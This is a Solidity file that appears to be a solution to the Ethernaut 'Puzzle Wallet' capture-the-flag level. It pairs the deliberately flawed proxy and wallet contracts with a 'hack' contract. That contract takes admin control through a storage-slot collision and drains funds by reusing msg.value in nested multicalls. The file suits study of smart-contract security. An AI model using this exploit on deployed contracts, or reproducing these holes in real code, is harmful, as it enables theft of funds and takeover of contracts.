// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/v4.9.0/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract PuzzleProxy is ERC1967Proxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) ERC1967Proxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

interface IP {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract hack {
    IP public proxy;
    address public owner;
    
    constructor(address _taget) {
        owner = msg.sender;
        proxy = IP(_taget);
    }

    function pwn() public payable  returns(address) {
        require(msg.sender == owner, "Not owner");
        // init -> whitelist
        proxy.proposeNewAdmin(address(this));
        proxy.addToWhitelist(address(this));

        bytes[] memory depData = new bytes[](1);
        depData[0] = abi.encodeWithSelector(proxy.deposit.selector);
        
        bytes[] memory data = new bytes[](2);
        // deposit
        data[0] = depData[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(proxy.multicall.selector, depData);
        proxy.multicall{value: 0.001 ether}(data);

        // withdraw
        proxy.execute(msg.sender, 0.002 ether, "");

        // set admin
        proxy.setMaxBalance(uint256(uint160(msg.sender)));
        return proxy.admin();
    }

    function withdraw() public payable{
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(owner));
    }
}

